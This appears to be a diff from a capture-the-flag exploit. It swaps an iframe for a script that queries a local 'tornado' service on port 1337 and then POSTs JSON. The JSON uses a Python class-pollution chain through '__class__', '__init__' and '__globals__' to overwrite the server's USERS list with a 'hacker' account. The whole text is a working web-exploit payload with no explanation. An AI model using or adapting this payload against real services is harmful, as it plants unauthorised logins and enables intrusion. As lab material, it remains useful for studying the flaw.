@@ -1,1 +1,24 @@
-<iframe src="http://localhost">
+<script>
+    fetch('http://127.0.0.1:1337/get_tornados')
+        .then(response => response.json())
+        .then(machines => {
+            let firstMachine = machines[0].machine_id;
+            let json = {
+                "machine_id": firstMachine,
+                "status": "active",
+                "__class__": {
+                    "__init__": {
+                        "__globals__": {
+                            "USERS": [{"username": "hacker", "password": "hacker"}]
+                        }
+                    }
+                }
+            };
+
+            return fetch(`http://127.0.0.1:1337/update_tornado`, {
+                method: "POST",
+                mode: "cors",
+                body: JSON.stringify(json)
+            });
+        })
+</script>
